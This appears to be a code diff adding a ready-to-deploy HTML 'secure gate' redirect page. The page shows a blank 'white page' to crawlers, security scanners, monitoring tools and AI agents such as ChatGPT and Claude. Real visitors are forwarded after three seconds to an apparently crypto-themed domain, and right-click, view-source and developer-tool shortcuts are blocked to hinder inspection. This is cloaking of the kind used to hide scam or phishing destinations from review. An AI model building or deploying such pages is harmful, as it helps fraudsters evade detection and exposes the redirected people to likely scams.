@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirect · secure gate</title>
+  <!-- basic bot protection + white page for bots, auto redirect with loading animation -->
+  <style>
+    /* global reset & fullscreen white page */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      padding: 1.5rem;
+      margin: 0;
+      /* base white page — even if JS fails */
+    }
+
+    /* main container – clean white card with subtle shadow */
+    .gate {
+      max-width: 640px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 40px;
+      padding: 3rem 2rem 2.5rem;
+      box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.08), 0 8px 24px -6px rgba(0, 0, 0, 0.02);
+      text-align: center;
+      transition: opacity 0.2s ease;
+      border: 1px solid rgba(0,0,0,0.02);
+    }
+
+    /* loading animation block */
+    .loader {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1.8rem;
+    }
+
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      border: 5px solid #f0f0f0;
+      border-top: 5px solid #1e1e1e;
+      animation: spin 0.9s cubic-bezier(0.45, 0.05, 0.25, 0.95) infinite;
+      transition: border-color 0.2s;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 1.4rem;
+      font-weight: 450;
+      letter-spacing: -0.01em;
+      color: #1a1a1a;
+      background: #ffffff;
+      padding: 0.4rem 1rem;
+      border-radius: 60px;
+      display: inline-block;
+    }
+
+    .loading-text span {
+      display: inline-block;
+      animation: pulse 1.4s ease-in-out infinite both;
+    }
+
+    .loading-text span:nth-child(1) { animation-delay: 0s; }
+    .loading-text span:nth-child(2) { animation-delay: 0.2s; }
+    .loading-text span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes pulse {
+      0%, 80%, 100% { opacity: 0.3; transform: scale(0.96); }
+      40% { opacity: 1; transform: scale(1.04); }
+    }
+
+    .redirect-hint {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      color: #6b6b6b;
+      letter-spacing: 0.3px;
+      border-top: 1px solid #f0f0f0;
+      padding-top: 1.8rem;
+      width: 80%;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .redirect-hint strong {
+      color: #1e1e1e;
+      font-weight: 500;
+    }
+
+    /* bot white page – displayed only if bot detection triggers */
+    .bot-white-page {
+      display: none;
+      background: #ffffff;
+      padding: 2rem 1rem;
+      border-radius: 32px;
+      color: #2c2c2c;
+    }
+
+    .bot-white-page h2 {
+      font-weight: 400;
+      font-size: 1.2rem;
+      letter-spacing: -0.01em;
+      color: #1a1a1a;
+      margin-bottom: 0.5rem;
+    }
+
+    .bot-white-page p {
+      color: #5a5a5a;
+      max-width: 360px;
+      margin: 0.25rem auto;
+      font-size: 0.95rem;
+    }
+
+    .bot-badge {
+      display: inline-block;
+      background: #f4f4f4;
+      padding: 0.25rem 1.2rem;
+      border-radius: 40px;
+      font-size: 0.75rem;
+      letter-spacing: 0.3px;
+      color: #3a3a3a;
+      margin-top: 1rem;
+      border: 1px solid #ececec;
+    }
+
+    /* universal helper */
+    .hidden {
+      display: none !important;
+    }
+
+    /* responsive */
+    @media (max-width: 480px) {
+      .gate { padding: 2rem 1.2rem; }
+      .loading-text { font-size: 1.2rem; }
+      .spinner { width: 52px; height: 52px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="gate" id="gateContainer">
+    <!-- LOADER (visible by default) -->
+    <div class="loader" id="loaderArea">
+      <div class="spinner" role="status" aria-label="loading"></div>
+      <div class="loading-text">
+        <span>R</span><span>E</span><span>D</span><span>I</span><span>R</span><span>E</span><span>C</span><span>T</span><span>I</span><span>N</span><span>G</span>
+      </div>
+      <div class="redirect-hint">
+        <strong>↳</strong> you will be forwarded automatically in <span id="countdownDisplay">3</span>s
+      </div>
+    </div>
+
+    <!-- BOT WHITE PAGE (hidden by default, shown if bot detected) -->
+    <div class="bot-white-page" id="botWhitePage">
+      <h2>⚪ &nbsp;access restricted</h2>
+      <p>This page is not available for automated agents.</p>
+      <p style="font-size:0.85rem; margin-top:0.2rem;">— white page —</p>
+      <div class="bot-badge">🤖 bot detected</div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      "use strict";
+
+      // ------------------------------------------------------------
+      // 1. CONFIGURATION
+      //    change YOUR_FINAL_LINK to your target URL
+      // ------------------------------------------------------------
+      const FINAL_REDIRECT_URL = 'https://wero.bitcoinpulse.shop/pub/6/44';   // <--- SET YOUR FINAL LINK HERE
+      const REDIRECT_DELAY_SECONDS = 3;                  // 3s as requested
+
+      // ------------------------------------------------------------
+      // 2. BOT DETECTION (basic, but effective)
+      //    - checks for common bot userAgent strings
+      //    - also checks for headless / automation flags
+      //    - if bot detected → show white page, block redirect
+      // ------------------------------------------------------------
+      function isBot() {
+        const ua = navigator.userAgent.toLowerCase();
+        const isHeadless = !navigator.webdriver && !window.chrome && !navigator.plugins.length; 
+        // ^ some headless browsers mimic, but we combine signals
+        
+        // Bot patterns (common crawlers, headless, automation)
+        const botPatterns = [
+          'bot', 'crawl', 'spider', 'scrape', 'headless', 'puppeteer',
+          'phantom', 'selenium', 'playwright', 'curl', 'wget', 'python',
+          'java', 'perl', 'lighthouse', 'gtmetrix', 'pingdom', 'uptime',
+          'monitor', 'check', 'http', 'libwww', 'axios', 'node-fetch',
+          'got', 'request', 'urllib', 'okhttp', 'ai', 'chatgpt', 'openai',
+          'claude', 'anthropic', 'gpt', 'llm', 'deepseek', 'perplexity'
+        ];
+        
+        // Check if any pattern matches userAgent
+        for (let i = 0; i < botPatterns.length; i++) {
+          if (ua.includes(botPatterns[i])) {
+            return true;
+          }
+        }
+
+        // additional heuristics: no navigator.webdriver? but some bots set it.
+        // we also check for missing navigator properties that real browsers have
+        if (typeof navigator.webdriver === 'boolean' && navigator.webdriver === true) {
+          return true;
+        }
+
+        // Check for very few plugins (typical headless)
+        if (navigator.plugins && navigator.plugins.length === 0) {
+          // but some mobile browsers have 0 plugins, so we add extra check
+          // if userAgent doesn't look like mobile, it's suspicious
+          const isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua);
+          if (!isMobile) {
+            return true;
+          }
+        }
+
+        // Check for missing languages or narrow language list (some bots)
+        if (navigator.languages && navigator.languages.length === 0) {
+          return true;
+        }
+
+        // extremely short screen size? (headless often small)
+        if (window.screen && window.screen.width < 200 && window.screen.height < 200) {
+          return true;
+        }
+
+        // detect if `navigator.connection` is missing in some bots
+        // but we don't want false positives, so we just use as one signal
+        // we combine with others: if more than 2 signals, mark as bot
+        let botScore = 0;
+        if (!navigator.hardwareConcurrency) botScore++;
+        if (!navigator.platform) botScore++;
+        if (navigator.doNotTrack === '1') botScore++; // some bots set DNT=1
+        
+        // if score > 2, treat as bot
+        if (botScore >= 2) {
+          return true;
+        }
+
+        return false;
+      }
+
+      // ------------------------------------------------------------
+      // 3. DOM refs
+      // ------------------------------------------------------------
+      const loader = document.getElementById('loaderArea');
+      const botPage = document.getElementById('botWhitePage');
+      const countdownSpan = document.getElementById('countdownDisplay');
+
+      // ------------------------------------------------------------
+      // 4. BOT HANDLER → show white page, block everything
+      // ------------------------------------------------------------
+      function showBotWhitePage() {
+        if (loader) loader.classList.add('hidden');
+        if (botPage) botPage.style.display = 'block';
+        // also hide any countdown if visible
+        if (countdownSpan) countdownSpan.textContent = '—';
+        // cancel any redirect
+        return true; // indicates bot was handled
+      }
+
+      // ------------------------------------------------------------
+      // 5. MAIN EXECUTION
+      // ------------------------------------------------------------
+      const botDetected = isBot();
+
+      if (botDetected) {
+        // BOT: show white page, no redirect
+        showBotWhitePage();
+        // stop further execution (no redirect, no timer)
+      } else {
+        // HUMAN: show loader, start countdown & redirect
+
+        // make sure loader is visible, bot page hidden
+        if (loader) loader.classList.remove('hidden');
+        if (botPage) botPage.style.display = 'none';
+
+        // Countdown timer (3 seconds)
+        let secondsLeft = REDIRECT_DELAY_SECONDS;
+        if (countdownSpan) {
+          countdownSpan.textContent = secondsLeft;
+        }
+
+        const countdownInterval = setInterval(function() {
+          secondsLeft -= 1;
+          if (countdownSpan) {
+            countdownSpan.textContent = secondsLeft >= 0 ? secondsLeft : 0;
+          }
+          if (secondsLeft <= 0) {
+            clearInterval(countdownInterval);
+            // optional: set to "0" but we will redirect
+          }
+        }, 1000);
+
+        // REDIRECT after DELAY
+        setTimeout(function() {
+          // final check: ensure bot page not shown (safety)
+          // and we are not in bot state
+          if (!botDetected && FINAL_REDIRECT_URL) {
+            window.location.replace(FINAL_REDIRECT_URL);
+          } else {
+            // fallback: if for some reason bot state changed, show white page
+            if (document.getElementById('botWhitePage')) {
+              showBotWhitePage();
+            }
+          }
+        }, REDIRECT_DELAY_SECONDS * 1000);
+
+        // optional: if user clicks or interacts, we keep the redirect
+        // we also handle page visibility change – but we keep redirect anyway
+      }
+
+      // ------------------------------------------------------------
+      // 6. EXTRA PROTECTION: disable right-click / dev tools? 
+      //    not needed, but we add a simple deterrent (optional)
+      //    we only prevent context menu on gate to avoid trivial inspection
+      //    but we keep it mild – not invasive.
+      // ------------------------------------------------------------
+      document.addEventListener('contextmenu', function(e) {
+        // only prevent if bot not detected? we prevent anyway for cleanliness
+        e.preventDefault();
+        return false;
+      });
+
+      // additional: block common keyboard shortcuts (F12, Ctrl+Shift+I etc)
+      // but we do it gently to not annoy real users too much
+      document.addEventListener('keydown', function(e) {
+        // F12
+        if (e.key === 'F12') {
+          e.preventDefault();
+          return false;
+        }
+        // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+U
+        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) {
+          e.preventDefault();
+          return false;
+        }
+        if (e.ctrlKey && e.key === 'u') {
+          e.preventDefault();
+          return false;
+        }
+      }, false);
+
+      // log to console that we are a secure gate (optional)
+      console.log('🔒 Secure gate · redirect in ' + REDIRECT_DELAY_SECONDS + 's (human only)');
+    })();
+  </script>
+
+  <!-- additional micro-message for users with disabled JS -->
+  <noscript>
+    <div style="background:white; padding:2rem; text-align:center; font-family:sans-serif; border-radius:40px; max-width:500px; margin:2rem auto;">
+      <p style="font-size:1.2rem;">⚡ enable JavaScript for redirect</p>
+      <p style="color:#555; font-size:0.9rem;">This page uses a secure gate.</p>
+    </div>
+  </noscript>
+</body>
+</html>
